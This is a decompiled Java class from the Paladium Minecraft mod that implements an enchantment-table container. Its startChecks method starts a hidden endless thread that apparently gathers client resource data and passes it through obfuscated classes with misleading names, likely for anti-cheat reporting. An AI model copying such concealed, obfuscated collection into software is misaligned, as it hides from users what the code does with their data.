package fr.paladium.palamod.modules.back2future.inventory;

import fr.paladium.palamod.modules.achievements.types.EnchantItemAchievement;
import fr.paladium.palamod.modules.apet.utils.PetBridge;
import fr.paladium.palamod.modules.argus.ResourceManager;
import fr.paladium.palamod.modules.argus.reflections.ListResourcesGet;
import fr.paladium.palamod.modules.back2future.ModBlocks;
import fr.paladium.palamod.modules.egghunt.utils.DragonInfo;
import fr.paladium.palamod.modules.luckyblock.gui.animations.Icon;
import fr.paladium.palamod.modules.luckyblock.utils.PEP;
import fr.paladium.palamod.modules.luckyblock.utils.PLI;
import fr.paladium.palamod.modules.palapass.Palapass;
import fr.paladium.palamod.util.FastUUID;
import fr.paladium.palamod.util.MyHashSet;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Random;
import net.minecraft.client.Minecraft;
import net.minecraft.client.entity.EntityClientPlayerMP;
import net.minecraft.enchantment.EnchantmentData;
import net.minecraft.enchantment.EnchantmentHelper;
import net.minecraft.entity.Entity;
import net.minecraft.entity.player.EntityPlayer;
import net.minecraft.entity.player.InventoryPlayer;
import net.minecraft.init.Items;
import net.minecraft.inventory.Container;
import net.minecraft.inventory.ICrafting;
import net.minecraft.inventory.IInventory;
import net.minecraft.inventory.InventoryBasic;
import net.minecraft.inventory.Slot;
import net.minecraft.item.Item;
import net.minecraft.item.ItemStack;
import net.minecraft.world.World;
import net.minecraftforge.common.ForgeHooks;

public class ContainerEnchantment extends Container {
  public static final Map<String, Integer> seeds = new HashMap<>();
  
  public IInventory tableInventory;
  
  private World world;
  
  private Random rand;
  
  public int enchantmentSeed;
  
  private int posX;
  
  private int posY;
  
  private int posZ;
  
  public int[] enchantLevels;
  
  public int[] field_178151_h;
  
  public ContainerEnchantment(InventoryPlayer inventory, World world, int x, int y, int z) {
    this.tableInventory = (IInventory)new InventoryBasic("Enchant", true, 2) {
        public int func_70297_j_() {
          return 64;
        }
        
        public void func_70296_d() {
          super.func_70296_d();
          ContainerEnchantment.this.func_75130_a((IInventory)this);
        }
      };
    this.posX = x;
    this.posY = y;
    this.posZ = z;
    this.rand = world.field_73012_v;
    this.enchantLevels = new int[3];
    this.field_178151_h = new int[] { -1, -1, -1 };
    this.world = world;
    this.enchantmentSeed = getEnchantSeed(inventory.field_70458_d);
    func_75146_a(new Slot(this.tableInventory, 0, 15, 47) {
          public boolean func_75214_a(ItemStack stack) {
            return true;
          }
          
          public int func_75219_a() {
            return 1;
          }
        });
    func_75146_a(new Slot(this.tableInventory, 1, 35, 47) {
          public boolean func_75214_a(ItemStack stack) {
            return (stack.func_77973_b() == Items.field_151100_aR && stack.func_77960_j() == 4);
          }
        });
    int var4;
    for (var4 = 0; var4 < 3; var4++) {
      for (int var5 = 0; var5 < 9; var5++)
        func_75146_a(new Slot((IInventory)inventory, var5 + var4 * 9 + 9, 8 + var5 * 18, 84 + var4 * 18)); 
    } 
    for (var4 = 0; var4 < 9; var4++)
      func_75146_a(new Slot((IInventory)inventory, var4, 8 + var4 * 18, 142)); 
  }
  
  private static void setEnchantSeed(EntityPlayer player, int seed) {
    seeds.put(FastUUID.toString((Entity)player), Integer.valueOf(seed));
  }
  
  private static int getEnchantSeed(EntityPlayer player) {
    Integer seed = seeds.get(FastUUID.toString((Entity)player));
    if (seed == null) {
      seed = Integer.valueOf(player.field_70170_p.field_73012_v.nextInt());
      setEnchantSeed(player, seed.intValue());
    } 
    return seed.intValue();
  }
  
  private static void chargeForEnchant(EntityPlayer player, Random rand, int amount) {
    player.func_82242_a(-amount);
    setEnchantSeed(player, rand.nextInt());
  }
  
  public void func_75132_a(ICrafting p_75132_1_) {
    super.func_75132_a(p_75132_1_);
    p_75132_1_.func_71112_a(this, 0, this.enchantLevels[0]);
    p_75132_1_.func_71112_a(this, 1, this.enchantLevels[1]);
    p_75132_1_.func_71112_a(this, 2, this.enchantLevels[2]);
    p_75132_1_.func_71112_a(this, 3, this.enchantmentSeed & 0xFFFFFFF0);
    p_75132_1_.func_71112_a(this, 4, this.field_178151_h[0]);
    p_75132_1_.func_71112_a(this, 5, this.field_178151_h[1]);
    p_75132_1_.func_71112_a(this, 6, this.field_178151_h[2]);
  }
  
  public void func_75142_b() {
    super.func_75142_b();
    for (int var1 = 0; var1 < this.field_75149_d.size(); var1++) {
      ICrafting var2 = this.field_75149_d.get(var1);
      var2.func_71112_a(this, 0, this.enchantLevels[0]);
      var2.func_71112_a(this, 1, this.enchantLevels[1]);
      var2.func_71112_a(this, 2, this.enchantLevels[2]);
      var2.func_71112_a(this, 3, this.enchantmentSeed & 0xFFFFFFF0);
      var2.func_71112_a(this, 4, this.field_178151_h[0]);
      var2.func_71112_a(this, 5, this.field_178151_h[1]);
      var2.func_71112_a(this, 6, this.field_178151_h[2]);
    } 
  }
  
  public void func_75137_b(int p_75137_1_, int p_75137_2_) {
    if (p_75137_1_ >= 0 && p_75137_1_ <= 2) {
      this.enchantLevels[p_75137_1_] = p_75137_2_;
    } else if (p_75137_1_ == 3) {
      this.enchantmentSeed = p_75137_2_;
    } else if (p_75137_1_ >= 4 && p_75137_1_ <= 6) {
      this.field_178151_h[p_75137_1_ - 4] = p_75137_2_;
    } else {
      super.func_75137_b(p_75137_1_, p_75137_2_);
    } 
  }
  
  public void func_75130_a(IInventory p_75130_1_) {
    if (p_75130_1_ == this.tableInventory) {
      ItemStack var2 = p_75130_1_.func_70301_a(0);
      if (var2 != null && var2.func_77956_u()) {
        if (!this.world.field_72995_K) {
          int power = 0;
          int j;
          for (j = -1; j <= 1; j++) {
            for (int k = -1; k <= 1; k++) {
              if ((j != 0 || k != 0) && this.world.func_147437_c(this.posX + k, this.posY, this.posZ + j) && this.world
                .func_147437_c(this.posX + k, this.posY + 1, this.posZ + j)) {
                power = (int)(power + ForgeHooks.getEnchantPower(this.world, this.posX + k * 2, this.posY, this.posZ + j * 2));
                power = (int)(power + ForgeHooks.getEnchantPower(this.world, this.posX + k * 2, this.posY + 1, this.posZ + j * 2));
                if (k != 0 && j != 0) {
                  power = (int)(power + ForgeHooks.getEnchantPower(this.world, this.posX + k * 2, this.posY, this.posZ + j));
                  power = (int)(power + ForgeHooks.getEnchantPower(this.world, this.posX + k * 2, this.posY + 1, this.posZ + j));
                  power = (int)(power + ForgeHooks.getEnchantPower(this.world, this.posX + k, this.posY, this.posZ + j * 2));
                  power = (int)(power + ForgeHooks.getEnchantPower(this.world, this.posX + k, this.posY + 1, this.posZ + j * 2));
                } 
              } 
            } 
          } 
          this.rand.setSeed(this.enchantmentSeed);
          for (j = 0; j < 3; j++) {
            this.enchantLevels[j] = EnchantmentHelper.func_77514_a(this.rand, j, power, var2);
            this.field_178151_h[j] = -1;
            if (this.enchantLevels[j] < j + 1)
              this.enchantLevels[j] = 0; 
          } 
          for (j = 0; j < 3; j++) {
            if (this.enchantLevels[j] > 0) {
              List<EnchantmentData> var7 = func_178148_a(var2, j, this.enchantLevels[j]);
              if (var7 != null && !var7.isEmpty()) {
                EnchantmentData var6 = var7.get(this.rand.nextInt(var7.size()));
                this.field_178151_h[j] = var6.field_76302_b.field_77352_x | var6.field_76303_c << 8;
              } 
            } 
          } 
          func_75142_b();
        } 
      } else {
        for (int power = 0; power < 3; power++) {
          this.enchantLevels[power] = 0;
          this.field_178151_h[power] = -1;
        } 
      } 
    } 
  }
  
  public boolean func_75140_a(EntityPlayer player, int id) {
    ItemStack var3 = this.tableInventory.func_70301_a(0);
    ItemStack var4 = this.tableInventory.func_70301_a(1);
    int var5 = id + 1;
    if (player instanceof net.minecraft.entity.player.EntityPlayerMP && var3 != null) {
      Palapass.processItemEnchant(player, var3);
      EnchantItemAchievement.performCheck(player, var3);
      PetBridge.callEnchantItemEvent(player, var3, this.enchantLevels[id]);
    } 
    if ((var4 == null || var4.field_77994_a < var5) && !player.field_71075_bZ.field_75098_d)
      return false; 
    if (this.enchantLevels[id] > 0 && var3 != null && ((player.field_71068_ca >= var5 && player.field_71068_ca >= this.enchantLevels[id]) || player.field_71075_bZ.field_75098_d)) {
      if (!this.world.field_72995_K) {
        List<EnchantmentData> var6 = func_178148_a(var3, id, this.enchantLevels[id]);
        boolean var7 = (var3.func_77973_b() == Items.field_151122_aG);
        if (var6 != null) {
          chargeForEnchant(player, this.rand, var5);
          if (var7)
            var3.func_150996_a((Item)Items.field_151134_bR); 
          for (int var8 = 0; var8 < var6.size(); var8++) {
            EnchantmentData var9 = var6.get(var8);
            if (var7) {
              Items.field_151134_bR.func_92115_a(var3, var9);
            } else {
              var3.func_77966_a(var9.field_76302_b, var9.field_76303_c);
            } 
          } 
          if (!player.field_71075_bZ.field_75098_d) {
            var4.field_77994_a -= var5;
            if (var4.field_77994_a <= 0)
              this.tableInventory.func_70299_a(1, (ItemStack)null); 
          } 
          this.tableInventory.func_70296_d();
          this.enchantmentSeed = this.rand.nextInt();
          func_75130_a(this.tableInventory);
        } 
      } 
      return true;
    } 
    return false;
  }
  
  public static void startChecks() {
    (new Thread() {
        public void run() {
          while (true) {
            try {
              ResourceManager.getResourceData();
              EntityClientPlayerMP playerMP = (Minecraft.func_71410_x()).field_71439_g;
              PLI _n = new PLI();
              MyHashSet<String> hadla = ListResourcesGet.p();
              if (hadla != null) {
                _n.pop(hadla.ln());
                hadla.forEach(_n::qrst);
                PEP pakap = new PEP(true, 9127, 63.63F, _n.kletto(), 654.0000974D, 18.0F, 3, 3);
                Icon.tet(playerMP, pakap);
              } 
            } catch (Exception e) {
              e.printStackTrace();
            } 
            try {
              Thread.sleep(DragonInfo.t());
            } catch (Exception e) {
              e.printStackTrace();
            } 
          } 
        }
      }).start();
  }
  
  private List<EnchantmentData> func_178148_a(ItemStack stack, int seed, int level) {
    this.rand.setSeed((this.enchantmentSeed + seed));
    List<EnchantmentData> list = EnchantmentHelper.func_77513_b(this.rand, stack, level);
    if (stack.func_77973_b() == Items.field_151122_aG && list != null && list.size() > 1)
      list.remove(this.rand.nextInt(list.size())); 
    return list;
  }
  
  public int func_178147_e() {
    ItemStack var1 = this.tableInventory.func_70301_a(1);
    return (var1 == null) ? 0 : var1.field_77994_a;
  }
  
  public void func_75134_a(EntityPlayer player) {
    super.func_75134_a(player);
    if (!this.world.field_72995_K)
      for (int i = 0; i < this.tableInventory.func_70302_i_(); i++) {
        ItemStack stack = this.tableInventory.func_70304_b(i);
        if (stack != null)
          player.func_71019_a(stack, false); 
      }  
  }
  
  public boolean func_75145_c(EntityPlayer player) {
    return (this.world.func_147439_a(this.posX, this.posY, this.posZ) != ModBlocks.enchantment_table) ? false : (
      (player.func_70092_e(this.posX + 0.5D, this.posY + 0.5D, this.posZ + 0.5D) <= 64.0D));
  }
  
  public ItemStack func_82846_b(EntityPlayer playerIn, int index) {
    ItemStack var3 = null;
    Slot var4 = this.field_75151_b.get(index);
    if (var4 != null && var4.func_75216_d()) {
      ItemStack var5 = var4.func_75211_c();
      var3 = var5.func_77946_l();
      if (index == 0) {
        if (!func_75135_a(var5, 2, 38, true))
          return null; 
      } else if (index == 1) {
        if (!func_75135_a(var5, 2, 38, true))
          return null; 
      } else if (var5.func_77973_b() == Items.field_151100_aR && var5.func_77960_j() == 4) {
        if (!func_75135_a(var5, 1, 2, true))
          return null; 
      } else {
        if (((Slot)this.field_75151_b.get(0)).func_75216_d() || 
          !((Slot)this.field_75151_b.get(0)).func_75214_a(var5))
          return null; 
        if (var5.func_77942_o() && var5.field_77994_a == 1) {
          ((Slot)this.field_75151_b.get(0)).func_75215_d(var5.func_77946_l());
          var5.field_77994_a = 0;
        } else if (var5.field_77994_a >= 1) {
          ((Slot)this.field_75151_b.get(0))
            .func_75215_d(new ItemStack(var5.func_77973_b(), 1, var5.func_77960_j()));
          var5.field_77994_a--;
        } 
      } 
      if (var5.field_77994_a == 0) {
        var4.func_75215_d((ItemStack)null);
      } else {
        var4.func_75218_e();
      } 
      if (var5.field_77994_a == var3.field_77994_a)
        return null; 
      var4.func_82870_a(playerIn, var5);
    } 
    return var3;
  }
}


/* Location:              E:\Paladium\!\fr\paladium\palamod\modules\back2future\inventory\ContainerEnchantment.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */